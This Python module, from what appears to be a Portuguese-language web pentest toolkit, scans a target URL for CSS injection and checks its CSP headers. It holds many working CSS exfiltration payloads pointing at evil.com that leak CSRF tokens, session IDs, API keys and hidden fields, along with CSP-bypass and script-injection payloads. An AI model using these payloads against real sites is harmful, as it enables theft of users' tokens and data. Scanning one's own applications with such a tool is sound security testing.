#!/usr/bin/env python3

"""Modulo de deteccao de CSS Injection via Style.



Testa se uma aplicacao web e vulneravel a CSS Injection via:

  - injection_points: Onde CSS pode ser injetado (style tag, style attr, etc)

  - data_extraction: CSS para extrair dados (background:url, content:url, etc)

  - attribute_leak: CSS attribute selectors para extrair atributos

  - selector_abuse: CSS selectors complexos (nth-child, :has, :is)

  - token_exfil: CSS para extrair tokens, cookies, valores de input

  - csp_bypass: CSS injection bypassando CSP (unicode, @import, expression)



Fluxo:

  1. Envia request para a URL alvo (baseline)

  2. Injeta payloads CSS via query params

  3. Verifica se payload e refletido no HTML

  4. Detecta contextos de CSS (style tag, style attr, etc)

  5. Verifica headers CSP para protecoes CSS

  6. Retorna resultado consolidado com severidade

"""

import argparse
import logging
import re
from collections.abc import Mapping
from dataclasses import asdict, dataclass
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    fetch,
    print_exploit_info,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.cssinject")



_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {

    "injection_points": [

        "style_tag_inject",

        "style_attr_inject",

        "link_href_inject",

        "import_url_inject",

        "comment_css_inject",

        "meta_refresh_css",

    ],

    "data_extraction": [

        "background_url",

        "content_url",

        "list_style_url",

        "cursor_url",

        "border_image_url",

        "mask_image_url",

        "font_face_url",

    ],

    "attribute_leak": [

        "attr_src_leak",

        "attr_href_leak",

        "attr_action_leak",

        "attr_value_leak",

        "attr_type_leak",

        "attr_data_leak",

    ],

    "selector_abuse": [

        "nth_child_selector",

        "has_selector",

        "is_selector",

        "where_selector",

        "not_selector",

        "has_is_chain",

    ],

    "token_exfil": [

        "csrf_token_leak",

        "auth_token_leak",

        "session_id_leak",

        "api_key_leak",

        "bearer_token_leak",

        "hidden_field_leak",

    ],

    "csp_bypass": [

        "import_unicode_bypass",

        "js_context_css",

        "data_uri_css",

        "expression_legacy",

        "import_charset_bypass",

        "link_import_xss",

        "css_import_js",

    ],

}



_INJECTION_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [

    (

        "style_tag_inject",

        "</style><style>body{background:red}</style>",

        "style_tag",

        ["</style>", "background"],

    ),

    (

        "style_attr_inject",

        "\" style=\"background:url(http://evil.com/)",

        "style_attr",

        ["style=", "background"],

    ),

    (

        "link_href_inject",

        "<link rel=stylesheet href=http://evil.com/style.css>",

        "link_css",

        ["link", "stylesheet"],

    ),

    (

        "import_url_inject",

        "@import url(http://evil.com/style.css);",

        "import_css",

        ["@import", "url"],

    ),

    (

        "comment_css_inject",

        "<!--</style><style>body{background:red}</style>-->",

        "comment_css",

        ["</style>", "background"],

    ),

    (

        "meta_refresh_css",

        "<meta http-equiv=refresh content=0;url=data:text/css,body{background:red}>",

        "meta_css",

        ["meta", "refresh"],

    ),

]



_DATA_EXTRACTION_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [

    (

        "background_url",

        "body{background:url(http://evil.com/?data=exfil)}",

        "background_url",

        ["background", "url"],

    ),

    (

        "content_url",

        "body::after{content:url(http://evil.com/?data=exfil)}",

        "content_url",

        ["content", "url"],

    ),

    (

        "list_style_url",

        "ul{list-style-image:url(http://evil.com/?data=exfil)}",

        "list_style",

        ["list-style", "url"],

    ),

    (

        "cursor_url",

        "body{cursor:url(http://evil.com/?data=exfil),auto}",

        "cursor_url",

        ["cursor", "url"],

    ),

    (

        "border_image_url",

        "body{border-image:url(http://evil.com/?data=exfil) 1}",

        "border_image",

        ["border-image", "url"],

    ),

    (

        "mask_image_url",

        "body{-webkit-mask-image:url(http://evil.com/?data=exfil)}",

        "mask_image",

        ["mask-image", "url"],

    ),

    (

        "font_face_url",

        "@font-face{font-family:x;src:url(http://evil.com/?data=exfil)}",

        "font_face",

        ["@font-face", "url"],

    ),

]



_ATTRIBUTE_LEAK_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [

    (

        "attr_src_leak",

        "img[src]{background:url(http://evil.com/?src=attr)}",

        "attr_src",

        ["[src]", "background"],

    ),

    (

        "attr_href_leak",

        "a[href]{background:url(http://evil.com/?href=attr)}",

        "attr_href",

        ["[href]", "background"],

    ),

    (

        "attr_action_leak",

        "form[action]{background:url(http://evil.com/?action=attr)}",

        "attr_action",

        ["[action]", "background"],

    ),

    (

        "attr_value_leak",

        "input[value]{background:url(http://evil.com/?value=attr)}",

        "attr_value",

        ["[value]", "background"],

    ),

    (

        "attr_type_leak",

        "input[type]{background:url(http://evil.com/?type=attr)}",

        "attr_type",

        ["[type]", "background"],

    ),

    (

        "attr_data_leak",

        "[data-secret]{background:url(http://evil.com/?secret=attr)}",

        "attr_data",

        ["[data-secret]", "background"],

    ),

]



_SELECTOR_ABUSE_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [

    (

        "nth_child_selector",

        "input:nth-child(1){background:url(http://evil.com/?nth=exfil)}",

        "nth_child",

        [":nth-child", "background"],

    ),

    (

        "has_selector",

        "div:has(input[type=password]){background:url(http://evil.com/?has=exfil)}",

        "has_selector",

        [":has(", "background"],

    ),

    (

        "is_selector",

        "input:is([type=text],[type=password]){background:url(http://evil.com/?is=exfil)}",

        "is_selector",

        [":is(", "background"],

    ),

    (

        "where_selector",

        "input:where([name*=token]){background:url(http://evil.com/?where=exfil)}",

        "where_selector",

        [":where(", "background"],

    ),

    (

        "not_selector",

        "input:not([type=hidden]){background:url(http://evil.com/?not=exfil)}",

        "not_selector",

        [":not(", "background"],

    ),

    (

        "has_is_chain",

        "div:has(input:is([name*=csrf])){background:url(http://evil.com/?chain=exfil)}",

        "has_is_chain",

        [":has(", ":is(", "background"],

    ),

]



_TOKEN_EXFIL_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [

    (

        "csrf_token_leak",

        "input[name*=csrf]{background:url(http://evil.com/?csrf=exfil)}",

        "csrf_token",

        ["[name*=csrf]", "background"],

    ),

    (

        "auth_token_leak",

        "input[name*=token]{background:url(http://evil.com/?token=exfil)}",

        "auth_token",

        ["[name*=token]", "background"],

    ),

    (

        "session_id_leak",

        "input[name*=session]{background:url(http://evil.com/?sid=exfil)}",

        "session_id",

        ["[name*=session]", "background"],

    ),

    (

        "api_key_leak",

        "input[name*=api_key]{background:url(http://evil.com/?apikey=exfil)}",

        "api_key",

        ["[name*=api_key]", "background"],

    ),

    (

        "bearer_token_leak",

        "input[name*=bearer]{background:url(http://evil.com/?bearer=exfil)}",

        "bearer_token",

        ["[name*=bearer]", "background"],

    ),

    (

        "hidden_field_leak",

        "input[type=hidden]{background:url(http://evil.com/?hidden=exfil)}",

        "hidden_field",

        ["[type=hidden]", "background"],

    ),

]



_CSP_BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [

    (

        "import_unicode_bypass",

        "@import url(http://evil.com/\\00style.css);",

        "import_unicode",

        ["@import", "url"],

    ),

    (

        "js_context_css",

        "javascript:body{background:url(http://evil.com/?js=exfil)}",

        "js_context",

        ["javascript:", "background"],

    ),

    (

        "data_uri_css",

        "body{background:url(data:text/css,body{background:url(http://evil.com/)})}",

        "data_uri",

        ["data:", "url"],

    ),

    (

        "expression_legacy",

        "body:expr/**/ession(alert(1))",

        "expression",

        ["expression"],

    ),

    (

        "import_charset_bypass",

        "@import url(http://evil.com/style.css) screen;",

        "import_media",

        ["@import", "url"],

    ),

    (

        "link_import_xss",

        '<link rel=import href="data:text/html,<script>alert(1)</script>">',

        "link_import",

        ["link", "import", "script"],

    ),

    (

        "css_import_js",

        '@import "data:text/css,body{background:url(javascript:alert(1))}";',

        "css_import_js",

        ["@import", "data:", "javascript:"],

    ),

]




def _load_category_map() -> dict[str, list[str]]:

    from mytools.data import load_payloads

    data = load_payloads("web", "cssinject", default={"category_map": _CATEGORY_MAP_DEFAULT})

    return data.get("category_map", _CATEGORY_MAP_DEFAULT)



_CATEGORY_MAP = _load_category_map()



def _load_injection_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads("web", "cssinject", default={"injection_payloads": [list(t) for t in _INJECTION_PAYLOADS_DEFAULT]})

    return [tuple(x) for x in data.get("injection_payloads", [list(t) for t in _INJECTION_PAYLOADS_DEFAULT])]



_INJECTION_PAYLOADS = _load_injection_payloads()



def _load_data_extraction_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads("web", "cssinject", default={"data_extraction_payloads": [list(t) for t in _DATA_EXTRACTION_PAYLOADS_DEFAULT]})

    return [tuple(x) for x in data.get("data_extraction_payloads", [list(t) for t in _DATA_EXTRACTION_PAYLOADS_DEFAULT])]



_DATA_EXTRACTION_PAYLOADS = _load_data_extraction_payloads()



def _load_attribute_leak_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads("web", "cssinject", default={"attribute_leak_payloads": [list(t) for t in _ATTRIBUTE_LEAK_PAYLOADS_DEFAULT]})

    return [tuple(x) for x in data.get("attribute_leak_payloads", [list(t) for t in _ATTRIBUTE_LEAK_PAYLOADS_DEFAULT])]



_ATTRIBUTE_LEAK_PAYLOADS = _load_attribute_leak_payloads()



def _load_selector_abuse_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads("web", "cssinject", default={"selector_abuse_payloads": [list(t) for t in _SELECTOR_ABUSE_PAYLOADS_DEFAULT]})

    return [tuple(x) for x in data.get("selector_abuse_payloads", [list(t) for t in _SELECTOR_ABUSE_PAYLOADS_DEFAULT])]



_SELECTOR_ABUSE_PAYLOADS = _load_selector_abuse_payloads()



def _load_token_exfil_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads("web", "cssinject", default={"token_exfil_payloads": [list(t) for t in _TOKEN_EXFIL_PAYLOADS_DEFAULT]})

    return [tuple(x) for x in data.get("token_exfil_payloads", [list(t) for t in _TOKEN_EXFIL_PAYLOADS_DEFAULT])]



_TOKEN_EXFIL_PAYLOADS = _load_token_exfil_payloads()



def _load_csp_bypass_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads("web", "cssinject", default={"csp_bypass_payloads": [list(t) for t in _CSP_BYPASS_PAYLOADS_DEFAULT]})

    return [tuple(x) for x in data.get("csp_bypass_payloads", [list(t) for t in _CSP_BYPASS_PAYLOADS_DEFAULT])]



_CSP_BYPASS_PAYLOADS = _load_csp_bypass_payloads()


_ALL_PAYLOADS: dict[str, list[tuple[str, str, str, list[str]]]] = {

    "injection_points": _INJECTION_PAYLOADS,

    "data_extraction": _DATA_EXTRACTION_PAYLOADS,

    "attribute_leak": _ATTRIBUTE_LEAK_PAYLOADS,

    "selector_abuse": _SELECTOR_ABUSE_PAYLOADS,

    "token_exfil": _TOKEN_EXFIL_PAYLOADS,

    "csp_bypass": _CSP_BYPASS_PAYLOADS,

}



_RE_STYLE_TAG = re.compile(r"<style[^>]*>", re.IGNORECASE)

_RE_STYLE_ATTR = re.compile(r"style\s*=", re.IGNORECASE)

_RE_LINK_CSS = re.compile(r"<link[^>]+rel\s*=\s*[\"']?stylesheet", re.IGNORECASE)

_RE_CSP = re.compile(r"content-security-policy", re.IGNORECASE)





@dataclass(frozen=True, slots=True)

class CSSInjectAttempt:

    """Tentativa individual de CSS Injection."""



    technique: str

    category: str

    context: str

    payload: str

    method: str

    status_baseline: int

    status_test: int

    size_baseline: int

    size_test: int

    status_changed: bool

    size_changed: bool

    csp_blocks_css: bool

    vulnerable: bool

    details: str

    error: str

    exploit: str = ""

    tool: str = ""





@dataclass(frozen=True, slots=True)

class CSSInjectResult:

    """Resultado consolidado do scan de CSS Injection."""



    target: str

    tls: bool

    baseline_status: int

    baseline_size: int

    attempts: list[CSSInjectAttempt]

    vulnerable_techniques: list[str]

    blocked_techniques: list[str]

    issues: list[str]

    overall_status: str





def _inject_payload(url: str, param: str, payload: str) -> str:

    """Injeta um payload como query parameter na URL."""

    parsed = urlparse(url)

    params = parse_qs(parsed.query)

    params[param] = [payload]

    new_query = urlencode(params, doseq=True)

    return urlunparse(parsed._replace(query=new_query))





def _check_css_reflection(body_str: str, payload: str) -> bool:

    """Verifica se o payload CSS esta refletido no HTML."""

    return payload.lower() in body_str.lower()





def _detect_css_contexts(body_str: str) -> list[str]:

    """Detecta contextos de CSS na resposta."""

    contexts: list[str] = []

    if _RE_STYLE_TAG.search(body_str):

        contexts.append("style_tag")

    if _RE_STYLE_ATTR.search(body_str):

        contexts.append("style_attr")

    if _RE_LINK_CSS.search(body_str):

        contexts.append("link_css")

    return contexts





def _check_csp_css(headers: Mapping[str, str]) -> dict[str, bool]:

    """Verifica se CSP bloqueia CSS injection."""

    csp_header = ""

    for key, val in headers.items():

        if _RE_CSP.match(key):

            csp_header = val

            break

    has_style_src = "style-src" in csp_header

    has_default_src = "default-src" in csp_header

    has_unsafe_inline = "unsafe-inline" in csp_header

    has_csp = bool(csp_header)

    return {

        "has_csp": has_csp,

        "has_style_src": has_style_src,

        "has_default_src": has_default_src,

        "has_unsafe_inline": has_unsafe_inline,

        "css_blocked": has_csp and not has_unsafe_inline,

    }





async def _test_css_category(

    client: httpx.AsyncClient,

    url: str,

    timeout: float,

    b_status: int,

    b_size: int,

    payloads: list[tuple[str, str, str, list[str]]],

    category: str,

) -> list[CSSInjectAttempt]:

    """Testa uma categoria de payloads CSS contra o alvo."""

    results: list[CSSInjectAttempt] = []



    for technique, payload, context, _indicators in payloads:

        param = f"_css_{technique}"

        test_url = _inject_payload(url, param, payload)



        try:

            t_status, t_headers, t_body, _t_raw = await fetch(client, test_url, timeout=timeout)

            t_size = len(t_body)

            body_str = t_body.decode(errors="replace")



            reflected = _check_css_reflection(body_str, payload)

            css_ctxs = _detect_css_contexts(body_str)

            csp_info = _check_csp_css(t_headers)



            status_changed = t_status != b_status

            size_changed = abs(t_size - b_size) > 50



            vulnerable = reflected and bool(css_ctxs)



            details = ""

            if reflected and css_ctxs:

                details = f"CSS refletido em contexto: {', '.join(css_ctxs)}"

            elif reflected:

                details = "Payload refletido (contexto CSS nao detectado)"

            if csp_info["css_blocked"]:

                details += " [CSP bloqueia style-src]"



            results.append(CSSInjectAttempt(

                technique=technique, category=category, context=context,

                payload=payload[:200], method="GET",

                status_baseline=b_status, status_test=t_status,

                size_baseline=b_size, size_test=t_size,

                status_changed=status_changed, size_changed=size_changed,

                csp_blocks_css=csp_info["css_blocked"],

                vulnerable=vulnerable, details=details, error="",

                exploit='css_exfiltration_payload' if vulnerable else "",

                tool="XSStrike",

            ))



        except Exception as e:

            results.append(CSSInjectAttempt(

                technique=technique, category=category, context=context,

                payload=payload[:200], method="GET",

                status_baseline=b_status, status_test=0,

                size_baseline=b_size, size_test=0,

                status_changed=False, size_changed=False,

                csp_blocks_css=False, vulnerable=False,

                details="", error=str(e)[:100],

            ))



    return results





def print_results(result: CSSInjectResult) -> None:

    """Exibe os resultados do scan de CSS Injection."""

    vuln = [a for a in result.attempts if a.vulnerable]

    blocked = [a for a in result.attempts if not a.vulnerable and not a.error]

    errors = [a for a in result.attempts if a.error]



    print(color("\n--- CSS Injection via Style Detection ---", Cyber.CYAN, Cyber.BOLD))

    print(color(f"  Alvo:         {result.target}", Cyber.WHITE))

    print(color(f"  TLS:          {'sim' if result.tls else 'nao'}", Cyber.WHITE))

    print(color(f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)", Cyber.WHITE))

    print(color(f"  Testes:       {len(result.attempts)}", Cyber.WHITE))

    print(color(f"  Vulneraveis:  {len(vuln)}", Cyber.GREEN if vuln else Cyber.GRAY))

    print(color(f"  Bloqueados:   {len(blocked)}", Cyber.GRAY))

    print(color(f"  Erros:        {len(errors)}", Cyber.RED if errors else Cyber.GRAY))



    if vuln:

        print(color("\n  [!] Vulnerabilidades encontradas:", Cyber.RED))

        seen: set[str] = set()

        for a in vuln:

            key = f"{a.technique}:{a.context}"

            if key in seen:

                continue

            seen.add(key)

            print(color(f"    [{a.category}] {a.technique}", Cyber.RED))

            print(color(f"      Contexto: {a.context}", Cyber.WHITE))

            if a.details:

                print(color(f"      Detalhes: {a.details}", Cyber.GRAY))

            print_exploit_info(a.exploit, a.tool)

        print(color(f"\n  Total: {len(vuln)} vulneraveis de {len(result.attempts)} testes", Cyber.WHITE))

    else:

        print(color("\n  [+] Nenhuma vulnerabilidade de CSS Injection detectada", Cyber.GREEN))



    if result.issues:

        print(color("\n  [!] Observacoes:", Cyber.YELLOW))

        for issue in result.issues:

            print(color(f"    - {issue}", Cyber.YELLOW))





async def run_scan(

    target: str,

    categories: list[str],

    timeout: float,

    output_file: str | None,

) -> int:

    """Executa o scan de CSS Injection."""

    logger.info("CSS Injection scan para %s", target)

    tls = target.startswith("https://")



    async with create_async_client(timeout=timeout) as client:

        try:

            b_status, _b_headers, b_body, _b_raw = await fetch(client, target, timeout=timeout)

            b_size = len(b_body)

        except Exception as e:

            logger.warning("Erro ao acessar %s: %s", target, e)

            return 1



        all_attempts: list[CSSInjectAttempt] = []

        test_categories = categories if categories else list(_CATEGORY_MAP.keys())



        for cat in test_categories:

            payloads = _ALL_PAYLOADS.get(cat, [])

            if payloads:

                all_attempts.extend(

                    await _test_css_category(client, target, timeout, b_status, b_size, payloads, cat),

                )



        vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})

        blocked_techs = list({a.technique for a in all_attempts if not a.vulnerable and not a.error})

        issues: list[str] = []



        if not all_attempts:

            issues.append("Nenhum teste de CSS Injection executado")



        csp_blocked = [a for a in all_attempts if a.csp_blocks_css]

        if csp_blocked:

            issues.append(f"{len(csp_blocked)} testes bloqueados por CSP (style-src)")



        result = CSSInjectResult(

            target=target, tls=tls,

            baseline_status=b_status, baseline_size=b_size,

            attempts=all_attempts,

            vulnerable_techniques=vuln_techs,

            blocked_techniques=blocked_techs,

            issues=issues,

            overall_status="vulnerable" if vuln_techs else ("safe" if blocked_techs else "unknown"),

        )



        print_results(result)

        logger.info(

            "CSS Injection scan concluido: %d testes, %d vulneraveis",

            len(all_attempts), len(vuln_techs),

        )



        if output_file:

            write_output(output_file, asdict(result))

            logger.info("Resultados salvos em %s", output_file)



        return 1 if vuln_techs else 0





def banner_art() -> None:

    """Exibe a banner do modulo."""

    art = r"""

    ___  ____  ___   ____    _  _____

   / _ \|  _ \/ _ \ |  _ \  / \|_   _|

  | | | | |_) | | | || | | |/ _ \ | |

  | |_| |  __/| |_| || |_| / ___ \| |

   \___/|_|    \___/ |____/_/   \_\_|

"""

    create_banner(art, "   cssinject: injection_points, data_extraction, attribute_leak, selector_abuse, token_exfil, csp_bypass")()





def build_parser() -> argparse.ArgumentParser:

    """Construtor do parser de argumentos."""

    parser = argparse.ArgumentParser(

        prog="mytools-cssinject",

        description="CSS Injection â€” detecta injeÃ§Ã£o CSS e tÃ©cnicas de exfiltraÃ§Ã£o de dados.",

        formatter_class=argparse.RawDescriptionHelpFormatter,

        epilog=(

            "Exemplos:\n"

            "  mytools-cssinject https://target.com\n"

            "  mytools-cssinject https://target.com -c injection_points\n"

            "  mytools-cssinject https://target.com -c data_extraction\n"

            "  mytools-cssinject https://target.com -c token_exfil\n"

            "  mytools-cssinject https://target.com --proxy http://127.0.0.1:8080"

        ),

    )

    parser.add_argument("url", help="URL alvo para o scan")

    parser.add_argument(

        "-c", "--category",

        default="all",

        choices=["all", "injection_points", "data_extraction", "attribute_leak",

                 "selector_abuse", "token_exfil", "csp_bypass"],

        help="Categoria de testes (default: todas)",

    )

    add_common_args(parser)

    return parser





def run_once(args: argparse.Namespace) -> int:

    """Executa um scan CSS Injection a partir de argumentos parseados."""

    logger.info("CSS Injection scan iniciado para %s", args.url)

    categories: list[str] = []

    if getattr(args, "category", None) and args.category != "all":

        categories = [args.category]

    return safe_asyncio_run(

        run_scan(

            target=args.url,

            categories=categories,

            timeout=getattr(args, "timeout", 10),

            output_file=getattr(args, "output", None),

        ),

    )





def main() -> int:

    """Entry point do modulo CSS Injection."""

    return run_main_loop(

        parser=build_parser(),

        banner_fn=banner_art,

        run_fn=run_once,

        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),

        prompt="cssinject> ",

        description="CSS Injection interativo.",

        example="https://target.com -c data_extraction",

        contextual_help=(

            "Uso: <url> [opcoes]\n"

            "Exemplos:\n"

            "  https://target.com\n"

            "  https://target.com -c injection_points\n"

            "  https://target.com -c data_extraction\n"

            "  https://target.com -c token_exfil\n"

            "  https://target.com --proxy http://127.0.0.1:8080"

        ),

    )

